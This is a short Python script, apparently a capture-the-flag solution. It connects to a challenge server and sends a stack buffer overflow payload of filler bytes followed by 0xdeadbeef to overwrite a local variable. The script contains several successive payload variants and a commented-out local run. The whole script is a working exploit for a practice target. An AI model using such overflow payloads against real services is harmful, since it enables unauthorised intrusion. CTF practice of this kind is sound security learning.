from subprocess import Popen, PIPE
import socket

def recv_until(sock, terminator=b"\n"):
    """Read data from the socket until a terminator is found."""
    data = b''
    while not data.endswith(terminator):
        recv = sock.recv(1)
        if not recv:
            # No more data received, break the loop
            break
        data += recv
    return data

# 48 bytes to fill the buffer + 4 bytes to overwrite the saved EBP (if necessary) + 4 bytes to overwrite the variable
payload = b"A"*48 + b"B"*4 + b"\xEF\xBE\xAD\xDE"

# print(payload.decode())

# Create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the server
s.connect(("recruit.osiris.bar", 21000))

print(recv_until(s))
# Construct the payload
payload = b"A"*48 + b"B"*4 + b"\xEF\xBE\xAD\xDE" + b"\n"
payload = b"A"*48 + b"\xEF\xBE\xAD\xDE" + b"\n"
payload = b"A"*48 + b"B"*4 + b"\xDE\xAD\xBE\xEF" + b"\n"

# Send the payload
s.sendall(payload)

print(recv_until(s))

# Close the socket
s.close()

# p = Popen(["/home/killua/ctf/osiris_recruit/pwn/stacking"], stdin=PIPE)
# p.communicate(input=payload)

